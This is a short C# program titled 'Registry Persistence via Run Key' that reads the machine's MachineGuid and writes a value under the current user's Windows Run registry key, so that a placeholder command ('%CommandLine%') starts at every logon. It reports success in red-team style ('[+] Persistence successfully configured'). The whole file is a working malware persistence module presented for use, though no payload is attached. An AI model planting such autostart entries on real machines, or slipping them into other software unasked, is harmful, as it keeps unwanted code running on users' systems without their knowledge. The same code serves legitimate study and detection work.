// Registry Persistence via Run Key
using System;
using Microsoft.Win32;

namespace PersistenceSample
{
    public class Program
    {
        public static void Main()
        {
            try
            {
                string deviceId = DeviceInfo.GetUUID();
                RegistryHelper.SetRunKey(deviceId, "%CommandLine%");
                Console.WriteLine($"[+] Persistence successfully configured under name: {deviceId}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] An error occurred: {ex.Message}");
            }
        }
    }

    public static class DeviceInfo
    {
        public static string GetUUID()
        {
            // Explicitly open the 64-bit LocalMachine hive to ignore WOW64 redirection
            using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            using (var subKey = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
            {
                if (subKey != null)
                {
                    object value = subKey.GetValue("MachineGuid");
                    if (value != null)
                    {
                        return new Guid(value.ToString().Trim()).ToString("N");
                    }
                }
            }

            return Guid.Empty.ToString("N");
        }
    }

    public static class RegistryHelper
    {
        private const string RunKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

        public static void SetRunKey(string name, string command)
        {
            // Explicitly open the 64-bit CurrentUser hive
            using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64))
            using (var subKey = baseKey.OpenSubKey(RunKeyPath, true))
            {
                if (subKey != null)
                {
                    subKey.SetValue(name, command);
                }
                else
                {
                    throw new InvalidOperationException("Unable to open the specified Registry key path.");
                }
            }
        }
    }
}